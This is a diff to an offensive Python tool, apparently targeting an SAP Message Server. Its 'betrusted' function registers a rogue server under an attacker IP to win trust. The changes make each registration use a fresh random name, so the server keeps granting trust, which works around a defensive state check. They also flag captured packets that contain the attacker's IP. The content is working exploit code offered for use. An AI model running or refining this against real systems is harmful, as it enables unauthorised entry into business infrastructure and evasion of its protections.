@@ -37,6 +37,7 @@ import socket
 import struct
 import threading
 import time
+import uuid
 import sys
 
 logger = logging.getLogger(__name__)
@@ -547,11 +548,16 @@ def _wait_and_reply_nilist(sock: socket.socket, fromname: str, key: bytes,
 
         # Log every received packet so we can see what the MS is sending
         opc = ms_parse_opcode(pkt)
+        try:
+            ip_bytes = socket.inet_aton(attacker_ip)
+            ip_in_pkt = " [OUR IP FOUND]" if ip_bytes in pkt else ""
+        except Exception:
+            ip_in_pkt = ""
         print(
             f"[*] Wait: MS pkt flag={flag:#04x} iflag={iflag:#04x} "
             f"msgtype={hdr.get('msgtype', 0):#04x} "
             f"opcode={opc.get('opcode', -1):#04x} len={len(pkt)} "
-            f"body={pkt[_HEADER_LEN:_HEADER_LEN+16].hex()}"
+            f"body={pkt[_HEADER_LEN:_HEADER_LEN+24].hex()}{ip_in_pkt}"
         )
 
         if flag == FLAG_ADMIN:
@@ -713,7 +719,7 @@ def check_ms_acl(host: str, port: int, timeout: float = 10.0) -> dict:
 
 def betrusted(host: str, port: int, attacker_ip: str,
               instance_nr: int = 0,
-              our_name: str = DEFAULT_REG_NAME,
+              our_name: str = "",   # empty = auto-generate unique name per run
               diag_port: int = DEFAULT_DIAG_PORT,
               timeout: float = 10.0,
               nilist_wait: float = 60.0,
@@ -753,6 +759,14 @@ def betrusted(host: str, port: int, attacker_ip: str,
         nilist_sent:     bool — ADM NILIST record was sent (inbound reply)
         nilist_response: bool — MS sent NILIST request and we replied
     """
+    # Generate a unique server name per run so the MS treats each registration
+    # as a brand-new server.  The MS tracks AD_GET_NILIST_PORT state per name:
+    # once it marks a server as "no NILIST" (after a failed or missing reply)
+    # it won't ask again for the same name, blocking the trust propagation.
+    if not our_name:
+        our_name = f"disp_{uuid.uuid4().hex[:8]}"
+    print(f"[*] Registering as {our_name!r} (unique per-run name)")
+
     if verbose:
         logging.basicConfig(level=logging.DEBUG,
                             format="[DBG] %(message)s", stream=sys.stderr)
@@ -876,8 +890,14 @@ def betrusted(host: str, port: int, attacker_ip: str,
                         continue
                     flag2  = hdr2.get("flag", -1)
                     iflag2 = hdr2.get("iflag", -1)
+                    try:
+                        ip_bytes = socket.inet_aton(attacker_ip)
+                        ip_tag = " [OUR IP FOUND]" if ip_bytes in pkt else ""
+                    except Exception:
+                        ip_tag = ""
                     print(f"[*] Hold: MS pkt flag={flag2:#04x} iflag={iflag2:#04x} "
-                          f"len={len(pkt)} body={pkt[_HEADER_LEN:_HEADER_LEN+16].hex()}")
+                          f"len={len(pkt)} body={pkt[_HEADER_LEN:_HEADER_LEN+24].hex()}"
+                          f"{ip_tag}")
                     try:
                         if flag2 == FLAG_ADMIN:
                             adm = pkt[_HEADER_LEN:]
